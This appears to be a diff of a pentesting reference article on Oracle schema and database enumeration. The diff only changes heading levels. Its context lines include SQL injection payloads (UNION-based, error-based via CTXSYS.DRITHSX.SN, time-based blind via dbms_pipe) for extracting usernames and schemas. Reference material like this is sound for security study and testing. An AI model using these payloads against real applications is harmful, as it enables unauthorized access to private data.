@@ -7,11 +7,9 @@ tags: ["databases", "schema", "enumeration"]
 lastUpdated: 2025-03-15
 ---
 
-## Database Names
-
 In Oracle, the concept of "database names" differs from other database management systems. Oracle uses a hierarchical structure where a single database instance can contain multiple schemas (schema ≈ user). This knowledge article covers how to extract database and schema information through SQL injection.
 
-### Oracle Database Architecture
+## Oracle Database Architecture
 
 In Oracle:
 
@@ -19,7 +17,7 @@ In Oracle:
 - A **schema** is a collection of database objects (tables, procedures, etc.) owned by a specific user
 - By default, each user has their own schema with the same name as the username
 
-### Current Database Context
+## Current Database Context
 
 To identify the current database context:
 
@@ -37,7 +35,7 @@ SELECT global_name FROM global_name;
 SELECT dbid FROM v$database;
 ```
 
-### Listing All Schemas/Users
+## Listing All Schemas/Users
 
 Since Oracle schemas are tied to users, you can list all schemas by querying user information:
 
@@ -52,7 +50,7 @@ SELECT username, created FROM all_users ORDER BY created;
 SELECT COUNT(*) FROM all_users;
 ```
 
-### Identifying Default Schemas
+## Identifying Default Schemas
 
 Oracle installations include many default schemas/users:
 
@@ -67,9 +65,9 @@ WHERE username IN (
 );
 ```
 
-### SQL Injection Examples
+## SQL Injection Examples
 
-#### UNION-Based Extraction
+### UNION-Based Extraction
 
 ```sql
 -- Basic schemas enumeration via UNION attack
@@ -79,7 +77,7 @@ WHERE username IN (
 ' UNION SELECT username||':'||created,NULL FROM all_users--
 ```
 
-#### Error-Based Extraction
+### Error-Based Extraction
 
 ```sql
 -- Error-based techniques to extract schema names
@@ -89,7 +87,7 @@ WHERE username IN (
 ' AND CTXSYS.DRITHSX.SN(1,(SELECT username FROM all_users WHERE username > 'A' AND ROWNUM=1))=1--
 ```
 
-#### Blind Extraction Techniques
+### Blind Extraction Techniques
 
 ```sql
 -- Boolean-based blind approach
@@ -100,7 +98,7 @@ WHERE username IN (
      THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
 ```
 
-### Finding Database Objects Within Schemas
+## Finding Database Objects Within Schemas
 
 Once you've identified schemas, you can enumerate their objects:
 
@@ -115,7 +113,7 @@ SELECT owner, table_name FROM all_tables ORDER BY owner, table_name;
 SELECT owner, table_name FROM all_tables WHERE table_name LIKE '%USER%';
 ```
 
-### Finding Database Links
+## Finding Database Links
 
 Database links provide connections to other Oracle databases, which can be valuable targets:
 
@@ -127,7 +125,7 @@ SELECT * FROM all_db_links;
 SELECT * FROM dba_db_links;
 ```
 
-### Pluggable Databases (Oracle 12c+)
+## Pluggable Databases (Oracle 12c+)
 
 In Oracle 12c and later, the multitenant architecture introduces pluggable databases (PDBs):
 
@@ -142,7 +140,7 @@ SELECT con_id, name, open_mode FROM v$containers;
 SELECT COUNT(*) FROM v$system_parameter WHERE name = 'enable_pluggable_database';
 ```
 
-### Tablespace Information
+## Tablespace Information
 
 Tablespaces are logical storage units in Oracle and can provide insights about database organization:
 
@@ -154,7 +152,7 @@ SELECT tablespace_name FROM user_tablespaces;
 SELECT tablespace_name, status, contents FROM dba_tablespaces;
 ```
 
-### Container Database (CDB) Information (Oracle 12c+)
+## Container Database (CDB) Information (Oracle 12c+)
 
 In multitenant architecture, extracting container database information:
 
@@ -166,7 +164,7 @@ SELECT CDB FROM v$database;
 SELECT SYS_CONTEXT('USERENV', 'CON_NAME') FROM dual;
 ```
 
-### TNS Listener Information
+## TNS Listener Information
 
 For broader database enumeration, extracting information about configured services:
 
@@ -178,16 +176,16 @@ SELECT name, value FROM v$parameter WHERE name LIKE '%service_name%';
 SELECT * FROM v$listener_network;
 ```
 
-### Practical SQL Injection Techniques
+## Practical SQL Injection Techniques
 
-#### Data Export Approach
+### Data Export Approach
 
 ```sql
 -- Export schema list to a table
 ' UNION SELECT username,'x' FROM all_users ORDER BY username;
 ```
 
-#### Pagination for Large Results
+### Pagination for Large Results
 
 ```sql
 -- Get schemas in batches of 10 (first page)
@@ -197,7 +195,7 @@ SELECT * FROM v$listener_network;
 ' UNION SELECT username,NULL FROM all_users WHERE ROWNUM <= 20 MINUS SELECT username,NULL FROM all_users WHERE ROWNUM <= 10--
 ```
 
-#### Finding Schemas with Specific Privileges
+### Finding Schemas with Specific Privileges
 
 ```sql
 -- Find schemas with DBA role
